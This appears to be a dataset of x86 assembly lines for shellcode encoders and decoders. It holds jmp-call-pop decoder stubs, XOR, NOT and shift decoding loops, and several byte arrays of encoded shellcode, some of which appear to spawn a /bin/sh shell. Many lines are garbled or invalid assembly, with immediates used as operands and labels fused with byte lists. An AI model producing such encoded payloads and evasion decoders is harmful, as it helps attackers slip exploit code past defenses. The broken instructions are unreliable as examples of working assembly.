_start :
"mov eax , 106"
_start : \n jmp short call_decoder
_start : \n jmp call_decoder
_start : \n jmp call_decoder
_start : \n jmp short call_decoder
_start : \n jmp short call_decoder
_start : \n jmp short call_shellcode
_start : \n jmp short call_shellcode
_start : \n jmp short call_shellcode
_start : \n jmp short enc
_start : \n jmp short esp
"add al , 0x2"
"add al , 3"
"add byte [esi] , 0x02"
"add byte [esi] , 0x10"
"add eax , 4 \n jnz decode"
"add eax , ebx"
"add ebp , 0x2"
"add edi , 2"
"add esi , 2"
call decoder
decoder :
call decoder_setup
call returnlabel
call_decoded : \n call [esp]
call_decoder :
call_decoder :
call_decoder : \n call function_1
call_decoder : \n call [decoder]
call_decoder : \n dec call_decoder
"call_decoder : \n call [decoder] , 0xeb , 0x25 , 0x5e , 0x31 , 0xc9 , 0xb1 , 0x1e , 0x80 , 0x3e , 0x07 , 0x7c , 0x05 , 0x80 , 0x2e , 0x07 , 0xeb , 0x11 , 0x31 , 0xdb , 0x31 , 0xd2 , 0xb3 , 0x07 , 0xb2 , 0xff , 0x66 , 0x42 , 0x2a , 0x1e , 0x66 , 0x29 , 0xda , 0x88 , 0x16 , 0x46 , 0xe2 , 0xe2 , 0xeb , 0x05 , 0xe8 , 0xd6 , 0xff , 0xff , 0xff , 0x38 , 0xc7 , 0x57 , 0x6f , 0x69 , 0x68 , 0x7a , 0x6f , 0x6f , 0x69 , 0x70 , 0x75 , 0x36 , 0x6f , 0x36 , 0x36 , 0x36 , 0x36 , 0x90 , 0xea , 0x57 , 0x90 , 0xe9 , 0x5a , 0x90 , 0xe8 , 0xb7 , 0x12 , 0xd4 , 0x87"
call call_shellcode
"mov eax , 19"
call_shellcode : \n call [decoder]
call_shellcode :
call_shellcode : \n call function_1
call_shellcode : \n call [esp]
call_shellcode : \n call [esp]
check_even_odd :
"cmp al , cl \n jne short decode \n jmp shellcode"
"cmp bl , 0xaa \n je shellcode"
"cmp bl , 0xbb \n je xordecode \n jmp notdecode"
"cmp byte [esi] , 0x88 \n jmp shellcode"
jne short not_equal
cmp dword esi+edx+5 \n je execute_shellcode
common_commands : inc esi
cycle :
dec al \n jz shellcode
"sub ebx , 1"
"mov eax , 106"
call decode_pr
decode :
decode :
call decode
"mov eax , 19"
decode :
"decode : \n cmp byte [esi] , 0x7 \n jl lowbound \n jmp 0x7"
dec byte [bl]
decode : \n not byte [esi]
decode : \n not byte [esi]
"decode : \n xor byte [esi] , 0xaa"
decoded_shellcode : \n call [esp]
decoder_setup :
decoder :
call decoder
"mov eax , 19"
decoder :
decoder :
decode :
decoder :
decoder : \n pop esi
decoder : \n pop esi
"pop esi \n mov edi , edi"
enc :
"encoded_shellcode : db 0xc0 , 0x31 , 0x68 , 0x50 , 0x2f , 0x2f , 0x68 , 0x73 , 0x2f , 0x68 , 0x69 , 0x62 , 0x87 , 0x6e , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x90 , 0x80"
"encoded_shellcode : db 0x545 , 0x4a3 , 0x583 , 0x5d3 , 0x541 , 0x541 , 0x439 , 0x5d3 , 0x5d3 , 0x541 , 0x5e7 , 0x5d5 , 0x5cf , 0x411 , 0x4eb , 0x443 , 0x509 , 0x48d , 0x423 , 0x539"
"pop 0xaa , 0x62 , 0xc0 , 0xaa , 0xa0 , 0xaa , 0xd0 , 0xaa , 0x5e , 0xaa , 0x5e , 0xaa , 0xe6 , 0xaa , 0xd0 , 0xaa , 0xd0 , 0xaa , 0x5e , 0xaa , 0xc4 , 0xaa , 0xd2 , 0xaa , 0xdc , 0x89 , 0xe3 , 0xaa , 0xa0 , 0x89 , 0xe2 , 0xaa , 0xa6 , 0x89 , 0xe1 , 0xb0 , 0xaa , 0x16 , 0xcd , 0x80 , 0xbb"
"message : db 0x04 , 0x539 , 0x9d9 , 0x6c9 , 0xfc9 , 0xc49 , 0xc29 , 0x839 , 0xdf9 , 0xc49 , 0xc49 , 0x839 , 0x839 , 0xce9 , 0xc59 , 0x259 , 0x4f9 , 0xfc9 , 0x259 , 0x4e9 , 0xff9 , 0x259 , 0x4d9 , 0x1c9 , 0xa79 , 0x619 , 0x2c9 , 0x539"
encodedshellcode : db ë ^~1À°1Û óªu\ GëíèÞÿÿÿ1ªÀªPªhª/ª/ªsªhªhª/ªbªiªnªªãªPªªâªSªªáª°ª ªÍªª»»
"encodedshellcode : db 0x32 , 0x51 , 0x30 , 0x74 , 0x69 , 0x63 , 0x6f , 0xe4 , 0x8a , 0x54 , 0xe2 , 0x0c , 0x81 , 0xc1 , 0x69 , 0x30 , 0x69 , 0x30 , 0x6a , 0x8a , 0x51 , 0xe3 , 0x8a , 0xb1 , 0xce"
"encodedshellcode : db 0x43 , 0xed , 0x1d , 0xf4 , 0x40 , 0xfb , 0x6f , 0x7a , 0xa9 , 0xe , 0xb6 , 0xe , 0xbc , 0xc9 , 0xe3 , 0x7a , 0xaf , 0x7a , 0x78 , 0xe , 0xc5 , 0xda , 0x76 , 0x6a , 0x17 , 0x1a , 0x4e , 0x68 , 0x38 , 0xc2 , 0x99 , 0xfb , 0x35 , 0x68 , 0x84 , 0xd2 , 0xb3 , 0xcb , 0x7c , 0x68 , 0x78 , 0xe2 , 0x9a , 0xf5 , 0xe9 , 0x50 , 0xc0 , 0x24 , 0x91 , 0xf8 , 0xfe"
"encodedshellcode : db 0xd6 , 0x47 , 0xb7 , 0x9f , 0xd8 , 0xd8 , 0x94 , 0x9f , 0x9f , 0xd8 , 0xa5 , 0x9e , 0x99 , 0x7e , 0x24 , 0xb7 , 0x7e , 0x25 , 0xb4 , 0x7e , 0x26 , 0x57 , 0xfc , 0x3a , 0x87"
"encodedshellcode : db 0xeb , 0x0c , 0x5e , 0x31 , 0xc9 , 0xb1 , 0x19 , 0xf6 , 0x16 , 0x46 , 0xe2 , 0xfb , 0xeb , 0x05 , 0xe8 , 0xef , 0xff , 0xff , 0xff , 0xce , 0x3f , 0xaf , 0x97 , 0xd0 , 0xd0 , 0x8c , 0x97 , 0x97 , 0xd0 , 0x9d , 0x96 , 0x91 , 0x76 , 0x1c , 0xaf , 0x76 , 0x1d , 0xac , 0x76 , 0x1e , 0x4f , 0xf4 , 0x32 , 0x7f"
"encoder_shellcode : db 0x08 , 0x60 , 0x58 , 0xc8 , 0x39 , 0xb0 , 0xd8 , 0xc3 , 0x9f , 0x9f , 0xd1 , 0xb8 , 0xb3 , 0xfe , 0xb9 , 0x1e , 0x4e , 0xfd , 0x97 , 0x70 , 0x39 , 0xb0 , 0x6a , 0xdb , 0xb0 , 0xc4 , 0x09 , 0xcf , 0x74 , 0x25 , 0x76 , 0xe6 , 0xe6 , 0xe6 , 0xf6 , 0x90 , 0x90 , 0xaa , 0xaa"
even_number :
execute_shellcode : \n jmp short esp
format :
formatting :
call get_shellcode_addr
global _start
global _start
inc dx
inc eax
inc eax
inc ecx
inc ecx
inc edi
inc edi
inc edx
inc edx \n inc edx \n inc edx \n inc edx
inc esi
inc esi \n inc esi
inc esi \n inc esi
inc esi
inc esi \n inc esi
inc esi \n inc esi
inc esi \n jmp short decode
inc_dec :
jmp decode
jmp short call_decoder
"mov eax , 19"
jmp short call_shellcode
jmp short cycle
jmp short decode
jmp short decode
jmp decode
"lea decode_pr , [goto]"
jmp short get_shellcode_addr
jmp short inc_dec
jmp short setup
"mov eax , 19"
jmp short shell
jz short decoded_shellcode
"lea edi , [edi+2]"
"lea edi , [esi+13]"
"lea edi , [esi]"
"lea edi , [esi]"
"lea edi , [esi]"
"lea edi , [esi+0x1]"
"lea edi , [esi+2]"
loop check_even_odd \n jmp short shellcode
loop decode
loopnz decode \n jmp edx
loop encodedshellcode \n jmp short decode
loop ecx \n jmp short shellcode
loop decode \n jmp shellcode
loop decrypt \n jmp short decode
loopnz short decode \n jmp shellcode
loop encoded_shellcode \n jmp decode_loop
lowbound :
call main
"mov edi , al"
"mov edi , al"
"xchg esi , al"
"mov al , byte esi"
"mov al , byte esi"
"mov al , byte esi+1+ebp"
"mov cl , al"
"mov al , dl"
"mov dl , al"
"mov ax , [esi]"
edi+1+ecx : dw edi+1+ecx
"mov bh , bl"
"mov esi+edx+2 , bh"
"mov bl , byte [esi]"
"mov bl , 0x7"
"mov bl , 0xff"
"mov bl , byte [eax]"
"mov bl , byte [edi+ecx]"
"mov bl , byte [edi]"
"mov bl , byte [esi+eax +1]"
"mov bl , byte [esi+eax]"
"mov bl , byte [esi+edi]"
"mov bl , byte [esi+edx+1]"
"mov bl , byte [esi]"
"mov bl , byte [esi+eax*1]"
"mov byte [bl] , esi+eax*1+0x1 \n mov edi"
"mov byte [esi+3] , 0x7"
"mov bl , cl"
"mov bx , [esi]"
"mov byte [eax] , dl"
"mov edi , bl"
"mov byte [edi] , bl \n not byte [edi]"
"mov byte [edi] , bl"
"mov byte [bl] , edx+eax"
"mov byte [var1] , dl"
"mov byte [bl] , esi+eax"
"mov byte [esi] , dl"
"mov byte [bl] , esi+ecx"
"mov cl , [esp+eax+1]"
"mov byte [var2] , bh"
"mov byte [bl] , esp+eax+3"
"mov byte [esp] , ch"
"mov byte [bl] , edx+eax"
"mov ch , byte [esi+edx+4]"
mov byte 10
"mov cl , 13"
"mov cl , al"
"mov cl , byte [eax]"
"mov cl , byte [esi+edx+3]"
"mov cl , dl"
"mov dl , esi-1"
"mov dl , byte [esi+1]"
"mov dl , [esi+1]"
"mov dl , 0x45"
"mov dl , 0xff"
"mov dl , byte eax+1"
"mov dl , byte eax"
"mov dl , esi+1"
"mov dl , byte esi+edi+1"
"mov dl , byte [esi]"
"mov eax , edi"
"mov ecx , ebp"
"mov edi , 0xaaaa9090"
"mov edi , [esp]"
"mov edx , esp"
"mov edi , word ax"
negative : \n not dl \n inc dl
inc next_cycle \n jmp short edi
nop
not_equal :
call notdecode
odd_number :
pop esi
pop esi
pop esi
pop esi
"pop esi \n mov esi , [esi]"
push byte [esp]
"push esi \n mov edi , esp"
returnlabel :
"rol var0 , 1"
"ror cl , bl"
"ror esi , 1"
section . text
shellcode_length equ $-shellcode
shellcode_section : \n pop shellcode_section
"shellcode : db 0x0e , 0x3a , 0x94 , 0x12 , 0x12 , 0x12 , 0xb2 , 0x9b , 0x37 , 0xc3 , 0x52 , 0xb6 , 0x9d , 0xa2 , 0xc2 , 0x9d , 0xa4 , 0x1e , 0x9d , 0xa4 , 0xe6 , 0x9d , 0x84 , 0xfa , 0x21 , 0x49 , 0xdc , 0xf8 , 0xc3 , 0x11 , 0x7e , 0xce , 0xb3 , 0x8e , 0x14 , 0xfe , 0xf2 , 0x53 , 0x61 , 0x1f , 0x13 , 0x59 , 0x34 , 0x04 , 0xa4 , 0xa9 , 0x9d , 0xa4 , 0xe2 , 0x9d , 0xdc , 0xce , 0x9d , 0xde , 0xe3 , 0x8a , 0x35 , 0xda , 0x13 , 0x23 , 0xa3 , 0x9d , 0xab , 0xf2 , 0x13 , 0x25 , 0x9d , 0xdb , 0xea , 0x35 , 0xcc , 0xdb , 0x9d , 0xc6 , 0x9d , 0x13 , 0x28 , 0xc3 , 0x11 , 0x7e , 0x53 , 0x61 , 0x1f , 0x13 , 0x59 , 0xca , 0x32 , 0x87 , 0x08 , 0x15 , 0x8f , 0x0a , 0xcd , 0x8f , 0xf6 , 0x87 , 0x36 , 0xaa , 0x9d , 0xaa , 0xf6 , 0x13 , 0x25 , 0xb8 , 0x9d , 0x1e , 0xdd , 0x9d , 0xaa , 0xee , 0x13 , 0x25 , 0x9d , 0x16 , 0x9d , 0x13 , 0x22 , 0x9b , 0xd6 , 0xf6 , 0xf6 , 0xad , 0xad , 0xb3 , 0xab , 0xac , 0xa3 , 0x11 , 0x32 , 0xb1 , 0xb1 , 0xac , 0x9d , 0xe4 , 0x3d , 0x9f , 0xaf , 0xba , 0xc5 , 0xc4 , 0x12 , 0x12 , 0xba , 0x89 , 0x85 , 0xc4 , 0xb1 , 0xa6 , 0xba , 0xde , 0x89 , 0xf8 , 0x19 , 0x11 , 0x27 , 0x4a , 0x62 , 0x13 , 0x12 , 0x12 , 0xfb , 0x56 , 0xa6 , 0xa2 , 0xba , 0xfb , 0x92 , 0xbd , 0x12 , 0x11 , 0x27 , 0xa2 , 0xa2 , 0xa2 , 0xa2 , 0xd2 , 0xa2 , 0xd2 , 0xa2 , 0xba , 0x3c , 0x21 , 0x31 , 0x32 , 0x11 , 0x27 , 0x69 , 0xbc , 0x17 , 0xba , 0x52 , 0x7a , 0x86 , 0x59 , 0xba , 0x14 , 0x12 , 0x13 , 0x4d , 0x9b , 0x38 , 0xbc , 0xe2 , 0xa8 , 0xa9 , 0xba , 0x6b , 0x77 , 0x86 , 0xb3 , 0x11 , 0x27 , 0x97 , 0x52 , 0x86 , 0x1e , 0x11 , 0xe0 , 0x1a , 0x87 , 0x3e , 0xba , 0x02 , 0x47 , 0x74 , 0xa8 , 0x11 , 0x27 , 0xba , 0xb5 , 0xbf , 0xb6 , 0x12 , 0x9b , 0x35 , 0xa9 , 0xa9 , 0xa9 , 0xc3 , 0x08 , 0xbc , 0xe4 , 0xab , 0xa8 , 0x34 , 0x0f , 0xb8 , 0x59 , 0xd6 , 0xf6 , 0xce , 0x13 , 0x13 , 0x9f , 0xd6 , 0xf6 , 0xe2 , 0x58 , 0x12 , 0xd6 , 0xa6 , 0xa2 , 0xa8 , 0xa8 , 0xa8 , 0xd8 , 0xa8 , 0xe0 , 0xa8 , 0xa8 , 0xa5 , 0xa8 , 0xba , 0x8b , 0x5e , 0xd1 , 0x98 , 0x11 , 0x27 , 0x9b , 0x32 , 0xe0 , 0xa8 , 0xd8 , 0x11 , 0xc2 , 0xba , 0x1a , 0x99 , 0xef , 0xb2 , 0x11 , 0x27 , 0x4d , 0x02 , 0x47 , 0x74 , 0xa8 , 0xba , 0x78 , 0x67 , 0x4f , 0x6f , 0x11 , 0x27 , 0xce , 0x18 , 0x8e , 0x1c , 0x92 , 0x0d , 0x32 , 0x87 , 0x17 , 0x4d , 0xd9 , 0xe5 , 0x84 , 0xc1 , 0xbc , 0x12 , 0xa5 , 0x11 , 0x27 , 0x88"
"shellcode : db 0x18 , 0x38 , 0xc7 , 0x57 , 0x6f , 0x36 , 0x36 , 0x7a , 0x6f , 0x6f , 0x36 , 0x69 , 0x70 , 0x75 , 0x90 , 0xea , 0x38 , 0xd0 , 0x90 , 0xd1 , 0x71 , 0x12 , 0x5f , 0xd4 , 0x87"
"test 0x31 , 0xc0 , 0x31 , 0xdb , 0x31 , 0xc9 , 0x31 , 0xd2 , 0xb2 , 0xa4 , 0xeb , 0x1f , 0x5e , 0x8d , 0x3e , 0x8a , 0x1c , 0x0f , 0x88 , 0xdf , 0x88 , 0xd0 , 0x30 , 0xd8 , 0x74 , 0x16 , 0x66 , 0x8b , 0x44 , 0x0f , 0x01 , 0x66 , 0x31 , 0xd8 , 0x66 , 0x89 , 0x07 , 0x41 , 0x8d , 0x7f , 0x02 , 0xeb , 0xe4 , 0xe8 , 0xdc , 0xff , 0xff , 0xff , 0x7d , 0x4c , 0xa6 , 0x09 , 0xfe , 0xea , 0xd8 , 0x8b , 0x9b , 0x0c , 0x5f , 0x66 , 0x30 , 0x32 , 0xb9 , 0x07 , 0xe6 , 0xb7 , 0x0f , 0x69 , 0xc2 , 0xab , 0x2b , 0xf0 , 0x3e , 0x60 , 0x6c , 0xea , 0x82 , 0xe8 , 0x63 , 0x63 , 0x72 , 0x68 , 0x34 , 0x02 , 0xeb , 0xfb , 0xba , 0xef , 0xbf , 0x66 , 0xf4 , 0x15 , 0x9e , 0xbb , 0xdd , 0xe3 , 0x73 , 0xbe , 0xf3 , 0xbb , 0x32 , 0xfa , 0xeb , 0xef , 0x58 , 0x20 , 0x24 , 0x90 , 0xe3 , 0x85 , 0x2e , 0x64 , 0xe4 , 0x27 , 0x59 , 0xe9 , 0x3f , 0xee , 0x23 , 0x6e , 0x63 , 0xf0 , 0x3a , 0x47 , 0x2d , 0x78 , 0x68 , 0x30 , 0xa5 , 0x66 , 0xe6 , 0x2f , 0x69 , 0x10 , 0x91 , 0xfa , 0x92 , 0xd5 , 0x3e , 0x11 , 0x4d , 0xf4 , 0x9c , 0x9c , 0x16 , 0x39 , 0x74 , 0xa0 , 0xc9 , 0xce , 0xd2 , 0x5b , 0x31 , 0x5c , 0x0c , 0x0f , 0xfb , 0x72 , 0x1a , 0xb6 , 0x06 , 0xbd , 0xd1 , 0x1c , 0x51 , 0xa4 , 0x31 , 0xc0 , 0x31 , 0xdb , 0x31 , 0xc9 , 0x31 , 0xd2 , 0xb2 , 0xa4 , 0xeb , 0x1f , 0x5e , 0x8d , 0x3e , 0x8a , 0x1c , 0x0f , 0x88 , 0xdf , 0x88 , 0xd0 , 0x30 , 0xd8 , 0x74 , 0x16 , 0x66 , 0x8b , 0x44 , 0x0f , 0x01 , 0x66 , 0x31 , 0xd8 , 0x66 , 0x89 , 0x07 , 0x41 , 0x8d , 0x7f , 0x02 , 0xeb , 0xe4 , 0xe8 , 0xdc , 0xff , 0xff , 0xff , 0x7d , 0x4c , 0xa6 , 0x09 , 0xfe , 0xea , 0xd8 , 0x8b , 0x9b , 0x0c , 0x5f , 0x66 , 0x30 , 0x32 , 0xb9 , 0x07 , 0xe6 , 0xb7 , 0x0f , 0x69 , 0xc2 , 0xab , 0x2b , 0xf0 , 0x3e , 0x60 , 0x6c , 0xea , 0x82 , 0xe8 , 0x63 , 0x63 , 0x72 , 0x68 , 0x34 , 0x02 , 0xeb , 0xfb , 0xba , 0xef , 0xbf , 0x66 , 0xf4 , 0x15 , 0x9e , 0xbb , 0xdd , 0xe3 , 0x73 , 0xbe , 0xf3 , 0xbb , 0x32 , 0xfa , 0xeb , 0xef , 0x58 , 0x20 , 0x24 , 0x90 , 0xe3 , 0x85 , 0x2e , 0x64 , 0xe4 , 0x27 , 0x59 , 0xe9 , 0x3f , 0xee , 0x23 , 0x6e , 0x63 , 0xf0 , 0x3a , 0x47 , 0x2d , 0x78 , 0x68 , 0x30 , 0xa5 , 0x66 , 0xe6 , 0x2f , 0x69 , 0x10 , 0x91 , 0xfa , 0x92 , 0xd5 , 0x3e , 0x11 , 0x4d , 0xf4 , 0x9c , 0x9c , 0x16 , 0x39 , 0x74 , 0xa0 , 0xc9 , 0xce , 0xd2 , 0x5b , 0x31 , 0x5c , 0x0c , 0x0f , 0xfb , 0x72 , 0x1a , 0xb6 , 0x06 , 0xbd , 0xd1 , 0x1c , 0x51 , 0xa4"
"0x3e , 0xcd , 0x5d , 0x96 , 0xef , 0x75 , 0x3c , 0x3c , 0x80 , 0x75 , 0x75 , 0x3c , 0x6f , 0x76 , 0x7b , 0x96 , 0xf0 , 0x5d , 0xbd , 0x18 , 0xda , 0x8d : db var1"
"shellcode : db 0x62 , 0x60 , 0xa0 , 0x34 , 0x5e , 0x97 , 0xe6 , 0x34 , 0xd0 , 0x97 , 0xc4 , 0xb4 , 0xdc , 0xc4 , 0xc7 , 0x28 , 0x13 , 0x71 , 0xa6 , 0xc4 , 0xc3 , 0x58 , 0x16 , 0xe6 , 0x01"
"pop 0xbb , 0xec , 0x73 , 0xcc , 0x3f , 0x9d , 0xbb , 0x8d , 0x51 , 0xbb , 0xb5 , 0x1b , 0xbb , 0xb3 , 0x22 , 0xbb , 0xf2 , 0x79 , 0xbb , 0xae , 0x8e , 0xbb , 0xb5 , 0x61 , 0xbb , 0xb5 , 0x3d , 0xbb , 0xf2 , 0x6e , 0xbb , 0xf2 , 0x9f , 0xbb , 0xbf , 0x10 , 0xbb , 0xb4 , 0x89 , 0xcc , 0x76 , 0x2d , 0xcc , 0x1c , 0x2f , 0xbb , 0x8d , 0x91 , 0xcc , 0x76 , 0x7e , 0xcc , 0x1d , 0x92 , 0xbb , 0x8e , 0x80 , 0xcc , 0x76 , 0x7b , 0xcc , 0x1e , 0xa7 , 0xcc , 0x4f , 0x7f , 0xbb , 0xd6 , 0x2b , 0xcc , 0x32 , 0x24 , 0xcc , 0x7f , 0x37 , 0xaa"
"pop 0xc6 , 0x02 , 0x80 , 0x01 , 0x81 , 0x03 , 0xd1 , 0x01 , 0xbe , 0x02 , 0x5f , 0x01 , 0x98 , 0x03 , 0x1c , 0x06 , 0x60 , 0x08 , 0xf6 , 0x04 , 0xc5 , 0x01 , 0x92 , 0x04 , 0x30 , 0x07 , 0x64 , 0x06 , 0x3a , 0x04 , 0x58 , 0x08 , 0x4f , 0x03 , 0x59 , 0x05 , 0xd2 , 0x06 , 0x81 , 0x08 , 0x1a , 0x04 , 0x5f , 0x07 , 0x03 , 0x08 , 0xd8 , 0x04 , 0x0c , 0x04 , 0xbb , 0xbb"
"0xeb , 0x0d , 0x5e , 0x31 , 0xc9 , 0xb1 , 0x19 , 0x80 , 0x36 , 0xaa , 0x46 , 0xe2 , 0xfa , 0xeb , 0x05 , 0xe8 , 0xee , 0xff , 0xff , 0xff , 0x9b , 0x6a , 0xfa , 0xc2 , 0x85 , 0x85 , 0xd9 , 0xc2 , 0xc2 , 0x85 , 0xc8 , 0xc3 , 0xc4 , 0x23 , 0x49 , 0xfa , 0x23 , 0x48 , 0xf9 , 0x23 , 0x4b , 0x1a , 0xa1 , 0x67 , 0x2a : db var1"
"shellcode : db 0xf1 , 0x31 , 0x90 , 0x38 , 0x47 , 0x47 , 0x5c , 0x1b , 0x1b , 0x47 , 0x4d , 0x0b , 0x07 , 0xe7 , 0x6a , 0xb3 , 0xd9 , 0x6b , 0xb1 , 0xda , 0x68 , 0x51 , 0xbb , 0xc6 , 0x4d"
shift_decode :
"shl eax , 28"
"shl eax , 28"
"shr ax , 1"
"shr ax , cl \n not word ax"
"shr bl , 4"
"shr dl , 1"
"shr dl , 4"
"shr eax , 24"
"shr eax , 28"
global decoder
"sub ax , 13"
"sub al , bl"
"sub byte [esi] , bl"
"sub byte [esi] , 8 \n not byte [esi]"
"sub dl , cl"
"sub dl , decode_pr"
"sub dx , bx"
"sub 0x7f , 0x7f"
"sub esp , 0x7f"
switch :
jle esi
"xor al , var1"
"xor al , bl \n jz short bl"
"xor ax , 0x539"
"xor ax , bx"
"xor ax , bx \n jz close"
"xor byte [esi+edx] , bh"
"xor bl , bl \n jnz encodedshellcode"
"xor bl , 0xbb \n jz var2"
"xor bl , bl \n jz short 0xbb"
"xor byte [bl] , esi+edx"
"xor dl , bl \n jnz short var1"
"xor byte [esi] , 0x88"
"xor byte [esi] , 0x97"
"xor dl , byte [esi]"
"xor dl , byte [esi]"
"xor dl , byte [esi]"
"xor dl , var0"
"xor byte [ch] , esi+edx"
"xor cl , 0x32 \n jz short encodedshellcode"
"xor cl , 0xaa \n jnz next_cycle"
"xor cl , 0xaa \n jz short 0xaa"
"xor byte [esi+edx] , cl"
"xor dl , 0xbb \n jz next_cycle"
"xor eax , eax \n mov cl , 0x1"
"xor eax , eax \n mov bl , 15"
"xor ebx , ebx \n mul ebx"
"xor eax , eax \n xor ebx , ebx \n xor ecx , ecx \n xor ecx , ecx"
"xor eax , eax \n xor ebx , ebx \n xor ecx , ecx \n xor edx , edx"
"xor eax , eax \n xor ebx , ebx \n xor ecx , ecx \n xor edx , edx"
"xor ebp , ebp"
"xor ebx , ebx"
"xor ebx , ebx \n mov bl , [esi+1]"
"xor edx , edx \n mul edx"
"xor ecx , ecx"
"xor ecx , ecx \n mov dl , 0x19"
"xor 0x1e , 0x1e \n mov cl , 0x1e"
"xor ecx , ecx \n mov bl , 23"
"xor ecx , ecx \n mov bl , 25"
"xor shellcode_length , shellcode_length \n mov cl , shellcode_length"
"xor eax , eax \n xor ecx , ecx \n xor ecx , ecx"
"xor edx , edx \n mul edx"
"xor edx , edx \n mul edx"
"xor ebx , ebx \n mul ebx"
"xor edi , edi \n xor eax , eax \n xor ebx , ebx \n xor edx , edx"
"xor edx , edx \n mov cl , [esi+1]"
xordecode :
